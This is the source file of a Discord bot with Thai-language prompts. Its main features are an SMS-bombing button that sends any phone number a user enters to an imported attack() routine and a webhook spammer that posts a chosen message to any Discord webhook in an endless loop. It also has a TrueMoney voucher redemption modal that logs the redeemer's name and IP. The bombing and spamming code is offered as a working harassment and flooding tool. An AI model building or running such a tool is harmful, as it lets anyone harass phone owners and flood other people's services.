import nextcord
from nextcord.ext import commands
import json
import datetime
from requests import post, Session , get
import aiohttp
from re import search
from concurrent.futures import ThreadPoolExecutor
import threading
from random import choice
import requests
from Apisms import attack
config = json.load(open('config.json'))

intents = nextcord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=".",help_command=None,intents=intents)
ThreadPool = ThreadPoolExecutor(max_workers=int(100000000))
header = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"

ucant = nextcord.Embed(title=" ",description=f"คุณไม่สามารถใช้ได้\nกรุณาใช้ในห้องที่ถูกต้อง",color=0xFF0000)

async def logsend(embed):
  async with aiohttp.ClientSession() as session:
    webhook = nextcord.Webhook.from_url(config['webhook'], session=session)
    

    await webhook.send(embed=embed)
  
import datetime
class webhook(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("webhook ")  
        self.webhook = nextcord.ui.TextInput(
            label="SPAMMER webhook",
            placeholder="webhook URL ",
            max_length=150,
            required=True
        )
        self.add_item(self.webhook)
        self.message = nextcord.ui.TextInput(
            label="SPAMMER message",
            placeholder="message",
            max_length=39,
            required=True
        )
        self.add_item(self.message)
    async def callback(self, interaction: nextcord.Interaction):
        esfes = 1
        efs = 0
        webhook = self.webhook.value
        message =  self.message.value

        embed = nextcord.Embed(title="เริ่มทำงาน",color=0x17bd27)
        await interaction.send(embed=embed , ephemeral=True)
        while efs != esfes:
            data = {"content": message}
            response = requests.post(webhook, json=data)
            pass
        
  
    #await webhook.send(avatar_url="https://media.discordapp.net/attachments/1028562195862265916/1042474603051765760/16686156366746748566832948893197.gif")
class truemoney(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("โดเนท ")  
        self.truemoney = nextcord.ui.TextInput(
            label="อังเปา",
            placeholder="https://gift.truemoney.com/campaign/?v=xxxxxxxxxxxxxxxxxx",
            max_length=39,
            required=True
        )
        self.add_item(self.truemoney)
    async def callback(self, interaction: nextcord.Interaction):
            url = (self.truemoney.value)
            res = requests.post(f"https://gift.truemoney.com/campaign/vouchers/{url}/redeem",json={"mobile":config["Phone"],"voucher_hash":f"{url}"},headers={"Accept": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36","Content-Type": "application/json","Origin": "https://gift.truemoney.com","Accept-Language": "en-US,en;q=0.9","Connection": "keep-alive"})
            if res.status_code == 200:
                data_contry = requests.get("https://ipinfo.io/json")
                embed = nextcord.Embed(title="ข้อมูลการเติมเงิน",color=0x17bd27)
                embed.add_field(name='IP',value=data_contry.json()['ip'])
                embed.add_field(name='ชื่อของผู้เติมเงิน',value=res.json()["data"]["owner_profile"]["full_name"])
                embed.add_field(name='จำนวน',value=res.json()["data"]["voucher"]["amount_baht"] + " บาท")
                embed.set_footer(text="เติมเงินสำเร็จ  | " )
                await interaction.send(embed=embed, ephemeral=True)
                for role in interaction.guild.roles:
                    print(f"{interaction.user} | {self.truemoney.value}   ")
                    if type(role.name) == f'{role}':
                        await interaction.user.add_roles(role)
            else:
                embed = nextcord.Embed(title="⚠️ ไม่สามารถทำรายการได้",color=0xeb4034)
                await nextcord.send(embed=embed, ephemeral=True)
  

    
    
    
    
    
    
    
class Sms(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("ยิงเบอร์")  
        self.phone = nextcord.ui.TextInput(
            label="เบอร์",
            placeholder="092xxxxx",
            max_length=10,
            required=True
        )
        self.add_item(self.phone)
    async def callback(self, interaction: nextcord.Interaction):
            phone = self.phone.value
            if phone in config['blacklist']:
                embed=nextcord.Embed( description=f":face_with_symbols_over_mouth: : ควายกู blacklist เบอร์ไว้ : :face_with_symbols_over_mouth: ", color=0x00ff00)
                embed.set_footer(text="Bot by THEBKCX ")
                embed.set_author(name='THEBKCX')
                embed.set_image(url=config['imgurl'])
                embed.timestamp = datetime.datetime.utcnow()
                await interaction.send(embed=embed, ephemeral=True)
            else:
                try:
                    done=nextcord.Embed(description=f"เบอร์  📵     : ||{phone}|| \nสถานะ  :envelope_with_arrow:     : สุ่ม \nเป็นเวลา  :bar_chart:  : 5 ต่อรอบ", color=0x00ff00 )
                    done.set_footer(text="Bot by THEBKCX ")
                    done.set_image(url=config['imgurl'])
                    done.set_footer(text=interaction.user)
                    done.timestamp = datetime.datetime.utcnow()
                    await interaction.send(embed=done, ephemeral=True)
                    log=nextcord.Embed(description=f"{emojino}ผู้ใช้ : <@{interaction.user}> ",color=0x00FF00)
                    log.add_field(name=f"{emojino}> *เบอร์ที่ยิง*", value=f"```fix\n{phone}\n```", inline=True)
                    log.add_field(name=f"{emojino}> *จำนวนยิง*", value=f"```fix\n 5 \n```", inline=True)
                    log.add_field(name=f"{emojino}> *สถานะ*", value=f"```fix\n สุ่ม \n```", inline=True)

                    log.set_image("https://cdn.discordapp.com/attachments/889976848581287946/1193140899987865600/Herrscher.of.the.Void.full.2866346.gif?ex=65aba20e&is=65992d0e&hm=9afd68f45f0972ffadbaf18375adb52cf6e80cf59d83bbf6c0ecf1ca6e51a1e9&")
                   # log =embed.set_image(image1)
                    #log = embed.set_image(url="https://cdn.discordapp.com/attachments/1132157429363261571/1137229834733486194/one-piece.gif")       
                    log.timestamp = datetime.datetime.utcnow()
                    await logsend(embed=log)
                    attack(phone)
                    
                    print(f"Attack: {phone} ")

                except:
                    pass
                    
                    
emojino="❤"    
emojishop="❤"          
from colorama import init ,Fore ,Style #line:8
blue =Fore .BLUE +Style .BRIGHT #line:15
class Button(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.cooldown = commands.CooldownMapping.from_cooldown(1,int(config['cooldown']),commands.BucketType.member)

    @nextcord.ui.button(label="กดเพื่อยิงเบอร์", style=nextcord.ButtonStyle.red, emoji="<:5244discord:1043212425828257792",custom_id="sms")
    async def Sms(self, button: nextcord.Button, interaction: nextcord.Interaction):
         cooldown = self.cooldown.get_bucket(interaction.message).update_rate_limit()
         if cooldown:
            await interaction.response.send_message(f"กรุณารออีก {round(cooldown,1)} วินาทีแล้วกดปุ่มใหม่",ephemeral=True)
            return
         else:
            await interaction.response.send_modal(Sms())

    #เติทฝมเงิร :972776912927735838~1: :f1: :5cce66a3c70b48eda83414cc7d0dfe0f: :98: :98:
    @nextcord.ui.button(label="โดเนท", style=nextcord.ButtonStyle.red, emoji="💸",custom_id="api")
    async def api(self, button: nextcord.Button, interaction: nextcord.Interaction):
         cooldown = self.cooldown.get_bucket(interaction.message).update_rate_limit()
         if cooldown:
            await interaction.response.send_message(f"กรุณารออีก {round(cooldown,1)} วินาทีแล้วกดปุ่มใหม่",ephemeral=True)
            return
         else:
            await interaction.response.send_modal(truemoney())


    @nextcord.ui.button(label="webhook", style=nextcord.ButtonStyle.red, emoji="<:5244discord:1043212425828257792",custom_id="webhook")
    async def webhook(self, button: nextcord.Button, interaction: nextcord.Interaction):
         cooldown = self.cooldown.get_bucket(interaction.message).update_rate_limit()
         if cooldown:
            await interaction.response.send_message(f"กรุณารออีก {round(cooldown,1)} วินาทีแล้วกดปุ่มใหม่",ephemeral=True)
            return
         else:
            await interaction.response.send_modal(webhook())




            
import os
import time
lr = Fore.LIGHTRED_EX
@bot.event
async def on_ready():
    bot.add_view(Button())
    
    clear = lambda: os.system('cls')
    clear()
    os.system('cls')
    time.sleep(1)
    print(f"BOT NAME : {bot.user}")
    
    await bot.change_presence(activity = nextcord.Streaming(name =f"  ", url = "https:/"))




@bot.command(pass_context = True)
async def setup(ctx):
    if ctx.author.guild_permissions.administrator:
            
            embed = nextcord.Embed(description=f"กดปุ่มเพื่อยิงเบอร์",color=0x00ff00)
            embed.set_author(name="ยิงเบอร์")
            embed.set_image(url=config['imgurl'])
            await ctx.send(embed=embed, view=Button())
    else:
         await ctx.send("มึงไม่มีสิทธิ์!", ephemeral=True)


bot.run(config["token"])
